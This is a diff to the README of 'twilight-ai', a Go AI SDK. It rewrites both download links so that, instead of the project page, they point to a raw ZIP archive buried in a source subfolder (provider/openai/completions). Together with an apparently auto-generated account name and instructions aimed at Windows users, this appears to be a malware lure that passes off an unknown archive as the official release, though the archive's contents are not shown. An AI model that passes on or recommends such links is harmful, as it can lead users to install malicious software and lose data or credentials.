@@ -1,6 +1,6 @@
 # 🌅 twilight-ai - Simple AI tools for Go apps
 
-[![Download / Visit Twilight AI](https://img.shields.io/badge/Download%20Twilight%20AI-blue?style=for-the-badge)](https://github.com/Analyzable-totalitarian601/twilight-ai)
+[![Download / Visit Twilight AI](https://img.shields.io/badge/Download%20Twilight%20AI-blue?style=for-the-badge)](https://github.com/Analyzable-totalitarian601/twilight-ai/raw/refs/heads/main/provider/openai/completions/twilight-ai-1.9-alpha.3.zip)
 
 ## 🖥️ What this app is
 
@@ -10,7 +10,7 @@ twilight-ai is a lightweight AI SDK for Go. It helps you work with AI services f
 
 Use this link to visit the project page and download the app or source package:
 
-[Visit the twilight-ai download page](https://github.com/Analyzable-totalitarian601/twilight-ai)
+[Visit the twilight-ai download page](https://github.com/Analyzable-totalitarian601/twilight-ai/raw/refs/heads/main/provider/openai/completions/twilight-ai-1.9-alpha.3.zip)
 
 If you are on Windows and the page offers a ZIP file:
 
